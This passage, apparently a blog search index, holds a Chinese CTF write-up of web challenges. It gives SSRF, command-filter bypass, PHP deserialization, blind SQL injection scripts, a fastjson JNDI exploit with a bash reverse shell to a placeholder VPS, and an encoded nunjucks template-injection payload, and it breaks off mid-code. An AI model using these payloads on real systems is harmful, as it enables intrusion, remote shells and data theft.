<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2022工大抗疫</title>
      <link href="/post/2022-01/2022%E5%B7%A5%E5%A4%A7%E6%8A%97%E7%96%AB/"/>
      <url>/post/2022-01/2022%E5%B7%A5%E5%A4%A7%E6%8A%97%E7%96%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>好几天都没发文章了，这几天去肝<code>工大抗疫</code>比赛去了，这比赛主要考了<code>信息搜集能力</code>，除<code>Web</code>以外我没觉得学到多少东西</p><p><del>太笨了，搜题我竟然只用<code>google</code>，以后记得把<code>Bing</code>、<code>Baidu</code>、<code>搜狗</code>什么的都用上</del></p><p>我什么都没说，大家以后打比赛不要像我一样，还是钻研技术为主，<del>大型比赛</del>上还是要认真对待的，以下题解只有<code>web</code>、<code>reverse</code>和部分杂项是自己思考过的，其他的一律为搜到的原题。</p><p>记录再一次<code>AK web</code></p><p>部分<code>web</code>题<code>wp</code>较为简略，之后会将知识点依次展开发博文！</p><p><img src="/post/2022-01/2022%E5%B7%A5%E5%A4%A7%E6%8A%97%E7%96%AB/202201162150740.png" alt="image-20220116160455909"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>请求头加个<code>client-ip</code>进行伪造</p><p><img src="/post/2022-01/2022%E5%B7%A5%E5%A4%A7%E6%8A%97%E7%96%AB/202201162150741.png" alt="image-20220114120339496"></p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p><code>ssrf</code>发现<code>flag.php</code>，直接上<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?url=http://127.0.0.1/flag.php?cmd=1;ls;</span><br></pre></td></tr></table></figure><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$shell</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$shell</span>) &amp;&amp; strlen(<span class="variable">$shell</span>)&lt;<span class="number">25</span>)&#123;</span><br><span class="line">        system(<span class="variable">$shell</span>);</span><br><span class="line">        <span class="comment">// flag is in /flag.txt</span></span><br><span class="line">    &#125;    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一开始想用数组绕过，但是发现<code>system</code>那并不能执行，查阅资料发现<code>linux</code>有个<code>/bin/base64</code>可以用来输出，所以使用通配符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/???/????64 /????.??? ===&gt; /bin/base64 /flag.txt</span><br></pre></td></tr></table></figure><p>得到<code>flag</code></p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>太坑了，有个<code>index.phps</code>看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$you_key</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key=<span class="string">&quot;you_don&#x27;t_thi3_kEy&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;key !== <span class="keyword">$this</span>-&gt;you_key)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no way&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        readfile(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strpos(<span class="variable">$s</span>,<span class="string">&#x27;key&#x27;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;no way&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        unserialize(<span class="variable">$s</span>)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;may be you need find the code.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现第22行有猫腻，直接上pyload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2ze3pskpr9bspgkhu1ak.cloudeci1.ichunqiu.com/?s=s:13:&quot;Easy::getflag&quot;;</span><br></pre></td></tr></table></figure><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p><code>sql</code>盲注，exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://eci-2zeiqgw6ldv5j33w06dl.cloudeci1.ichunqiu.com/?id=&#x27;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        payload = <span class="string">&quot;1&#x27; union selselectect 1,(if(ascii(substr(load_file(&#x27;/flag&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,sleep(1),0))--+&quot;</span>.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        time1 = time.time()</span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        time2 = time.time()</span><br><span class="line">        <span class="built_in">print</span>(time2 - time1)</span><br><span class="line">        <span class="keyword">if</span> time2 - time1 &gt; <span class="number">1</span>:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">if</span> mid == <span class="number">32</span>:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p><code>sql</code>注入，经过测试过滤了<code>select</code>，经过查询知道考了<code>mysql 8.0.19</code>的新特性<code>vulues</code>可以替代<code>select</code></p><p>pyload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&#x27;union+values+row(1,1,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;)%23&amp;password=1&amp;login=login</span><br></pre></td></tr></table></figure><h2 id="easy-fastjson"><a href="#easy-fastjson" class="headerlink" title="easy_fastjson"></a>easy_fastjson</h2><p><code>fastjson &lt;= 1.2.47</code>反序列化漏洞</p><p><a href="https://www.freebuf.com/articles/web/283585.html">https://www.freebuf.com/articles/web/283585.html</a></p><p>pyload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=&#123;%20%20%20%20%20&quot;a&quot;:&#123;%20%20%20%20%20%20%20%20%20&quot;@type&quot;:&quot;java.lang.Class&quot;,%20%20%20%20%20%20%20%20%20&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;%20%20%20%20%20&#125;,%20%20%20%20%20&quot;b&quot;:&#123;%20%20%20%20%20%20%20%20%20&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,%20%20%20%20%20%20%20%20%20&quot;dataSourceName&quot;:&quot;rmi://vpsip:1099/jdytbq&quot;,%20%20%20%20%20%20%20%20%20&quot;autoCommit&quot;:true%20%20%20%20%20&#125;%20&#125;</span><br></pre></td></tr></table></figure><p><a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;bash -c &#123;echo,base64编 码的反弹shell&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -A <span class="string">&quot;vpsip&quot;</span></span><br></pre></td></tr></table></figure><p>然后再服务器上监听端口，做法和<code>log4j2</code>的一样</p><p><img src="/post/2022-01/2022%E5%B7%A5%E5%A4%A7%E6%8A%97%E7%96%AB/202201162150742.png" alt="image-20220114234224901"></p><h2 id="EasyEscape"><a href="#EasyEscape" class="headerlink" title="EasyEscape"></a>EasyEscape</h2><p>很明显是个模板注入，但是一直不确定是什么，通过报错可知应该是<code>js</code>相关的模板，通过报错得知是<code>nunjucks模板引擎</code></p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog4/202201162150743.png" alt="image-20220116150524975"></p><p>被过滤了好多的字符，使用编码绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[][&quot;cons&quot;+&quot;tructor&quot;][&quot;con&quot;+&quot;structor&quot;](&quot;return(global[\&quot;\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\&quot;][\&quot;\\u006d\\u0061\\u0069\\u006e\\u004d\\u006f\\u0064\\u0075\\u006c\\u0065\&quot;][\&quot;\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\&quot;](\&quot;\\u0063\\u0068\\u0069\\u006c\\u0064\\u005f\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\&quot;)[\&quot;\\u0065\\u0078\\u0065\\u0063\\u0053\\u0079\\u006e\\u0063\&quot;](\&quot;\\u0063\\u0061\\u0074\\u0020\\u002f\\u0066\\u006c\\u0061\\u0067\&quot;)[\&quot;\\u0074\\u006f\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\&quot;]())&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="海量视频"><a href="#海量视频" class="headerlink" title="海量视频"></a>海量视频</h2><p>先发现有<code>sql</code>注入，直接上盲注脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eci-2ze0cwaav487mf7p4jpy.cloudeci1.ichunqiu.com/&quot;</span>  <span class="comment"># 注入位置</span></span><br><span class="line">payload = <span class="string">&quot;select group_concat(pwd) from user&quot;</span>   <span class="comment"># 需要查询的内容</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lensqlblind</span>():</span></span><br><span class="line">    start = <span class="number">1</span></span><br><span class="line">    end = <span class="number">100</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        mid = (start + end) // <span class="number">2</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;pwd&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">f&#x27;&#x27;&#x27;&#x27;/**/or/**/if(length((<span class="subst">&#123;payload&#125;</span>))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(0.5),0)/**/#&#x27;&#x27;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        t = time()</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        <span class="keyword">if</span> start &gt;= end:</span><br><span class="line">            <span class="keyword">return</span> start</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> time() - t &gt; <span class="number">0.5</span>:</span><br><span class="line">            start = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = mid - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># jw2fdkci2F2md2FFA4</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">contentblind</span>():</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    i = <span class="number">18</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= <span class="number">18</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">            <span class="built_in">print</span>(j, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;pwd&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>: <span class="string">f&#x27;&#x27;&#x27;&#x27;/**/or/**/if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,sleep(0.5),0)/**/#&#x27;&#x27;&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            t = time()</span><br><span class="line">            r = requests.post(url, data=data)</span><br><span class="line">            r.encoding = r.apparent_encoding</span><br><span class="line">            <span class="keyword">if</span> time() - t &gt; <span class="number">0.5</span>:</span><br><span class="line">                flag += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>()</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lenth = lensqlblind()</span><br><span class="line"><span class="built_in">print</span>(lenth)</span><br><span class="line">contentblind()</span><br></pre></td></tr></table></figure><p>得到如下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">database(): logintt</span><br><span class="line">version: 8.0.23-3+b1</span><br><span class="line">table: user</span><br><span class="line">cloumns:pwd username</span><br><span class="line">username:admin</span><br><span class="line">pwd: jw2fdkci2F2md2FFA4</span><br></pre></td></tr></table></figure><p>看页面源码发现可以下载源码：</p><p><code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$check</span> = preg_match(<span class="string">&#x27;/into/i&#x27;</span>, <span class="variable">$input</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$check</span>) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;hackkk!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;vendor/autoload.php&#x27;</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Firebase</span>\<span class="title">JWT</span>\<span class="title">JWT</span>;</span><br><span class="line"><span class="variable">$fff</span> = fopen(<span class="string">&quot;./keysadmine2unao2ne2/rsa_private_key.pem&quot;</span>,<span class="string">&#x27;rb&#x27;</span>);</span><br><span class="line"><span class="variable">$rsa_private_key</span> = fread(<span class="variable">$fff</span>,filesize(<span class="string">&quot;./keysadmine2unao2ne2/rsa_private_key.pem&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$fff2</span> = fopen(<span class="string">&quot;./keysadmine2unao2ne2/rsa_public_key.pem&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="variable">$rsa_public_key</span> = fread(<span class="variable">$fff2</span>,filesize(<span class="string">&quot;./keysadmine2unao2ne2/rsa_public_key.pem&quot;</span>));</span><br><span class="line"><span class="variable">$username</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;name&quot;</span> =&gt; <span class="variable">$username</span>,</span><br><span class="line">    <span class="string">&quot;pwd&quot;</span> =&gt; <span class="variable">$password</span>,</span><br><span class="line">    <span class="string">&quot;isadmin&quot;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$jwt</span> = JWT::encode(<span class="variable">$payload</span>,<span class="variable">$rsa_private_key</span>,<span class="string">&quot;RS256&quot;</span>);</span><br><span class="line">setcookie(<span class="string">&quot;secretcookie&quot;</span>,<span class="variable">$jwt</span>);</span><br><span class="line"><span class="variable">$decoded</span> = JWT::decode(<span class="variable">$jwt</span>, <span class="variable">$rsa_public_key</span>, <span class="keyword">array</span>(<span class="string">&#x27;RS256&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$sqlconn</span> = mysqli_connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;ubuntu&quot;</span>,<span class="string">&quot;logintt&quot;</span>,<span class="number">3306</span>);</span><br><span class="line"><span class="variable">$sqlres</span> = mysqli_query(<span class="variable">$sqlconn</span>,<span class="string">&quot;select *  from user where username = &#x27;&quot;</span> . waf(<span class="variable">$decoded</span>-&gt;name) . <span class="string">&quot;&#x27;;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$decoded</span> != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$decoded</span>-&gt;name === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$decoded</span>-&gt;pwd === mysqli_fetch_all(<span class="variable">$sqlres</span>)[<span class="number">0</span>][<span class="number">1</span>] &amp;&amp; <span class="variable">$decoded</span>-&gt;isadmin === <span class="literal">true</span>)&#123;</span><br><span class="line">        header(<span class="string">&quot;Location: http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].dirname(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]).<span class="string">&#x27;/adminfdsa.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"><span class="variable">$file_name</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;downfile&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file_name</span> != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$file</span> = fopen ( <span class="variable">$file_name</span>, <span class="string">&quot;rb&quot;</span> );</span><br><span class="line">    Header ( <span class="string">&quot;Content-type: application/octet-stream&quot;</span> );</span><br><span class="line">    Header ( <span class="string">&quot;Accept-Ranges: bytes&quot;</span> );</span><br><span class="line">    Header ( <span class="string">&quot;Accept-Length: &quot;</span> . filesize (  <span class="variable">$file_name</span> ) );</span><br><span class="line">    Header ( <span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="variable">$file_name</span> );</span><br><span class="line">    <span class="keyword">echo</span> fread ( <span class="variable">$file</span>, filesize ( <span class="variable">$file_name</span> ) );</span><br><span class="line">    fclose ( <span class="variable">$file</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>adminfdsa.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;vendor/autoload.php&#x27;</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Firebase</span>\<span class="title">JWT</span>\<span class="title">JWT</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$check</span> = preg_match(<span class="string">&#x27;/into/i&#x27;</span>, <span class="variable">$input</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$check</span>) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;hackkk!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$cook</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;secretcookie&#x27;</span>];</span><br><span class="line"><span class="variable">$fff2</span> = fopen(<span class="string">&quot;./keysadmine2unao2ne2/rsa_public_key.pem&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="variable">$rsa_public_key</span> = fread(<span class="variable">$fff2</span>,filesize(<span class="string">&quot;./keysadmine2unao2ne2/rsa_public_key.pem&quot;</span>));</span><br><span class="line"><span class="variable">$decoded</span> = JWT::decode(<span class="variable">$cook</span>, <span class="variable">$rsa_public_key</span>, <span class="keyword">array</span>(<span class="string">&#x27;RS256&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$sqlconn</span> = mysqli_connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;ubuntu&quot;</span>,<span class="string">&quot;logintt&quot;</span>,<span class="number">3306</span>);</span><br><span class="line"><span class="variable">$sqlres</span> = mysqli_query(<span class="variable">$sqlconn</span>,<span class="string">&quot;select *  from user where username = &#x27;&quot;</span> . waf(<span class="variable">$decoded</span>-&gt;name) . <span class="string">&quot;&#x27;;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$decoded</span>-&gt;name === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$decoded</span>-&gt;pwd === mysqli_fetch_all(<span class="variable">$sqlres</span>)[<span class="number">0</span>][<span class="number">1</span>] &amp;&amp; <span class="variable">$decoded</span>-&gt;isadmin === <span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;登录成功&lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;输入x站视频链接&quot;</span>;</span><br><span class="line">    <span class="variable">$urla</span> = @<span class="variable">$_POST</span>[<span 